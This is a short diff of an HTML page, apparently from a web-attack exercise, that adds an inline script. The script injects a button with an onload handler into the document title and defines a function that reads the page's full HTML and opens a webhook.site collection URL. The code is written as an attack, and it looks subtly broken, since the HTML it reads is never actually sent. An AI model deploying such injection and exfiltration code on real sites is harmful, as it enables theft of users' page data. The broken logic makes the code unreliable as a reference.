@@ -10,7 +10,19 @@
             value="1000">
     </form>
 </body> -->
-<script src="attack.js"></script>
+<script>
+    function changeTitle() {
+        var attackScript = "<button onload='sendHTML()'></button>"
+        if (document.title != attackScript) {
+            document.title = attackScript;
+        }
+    }
+
+    function sendHTML() {
+        var html = document.documentElement.outerHTML;
+        window.open('https://webhook.site/6c81d56f-e76f-44e6-aaba-bf5126b5546c');
+    }
+</script>
 
 <body onload="changeTitle()">
 </body>
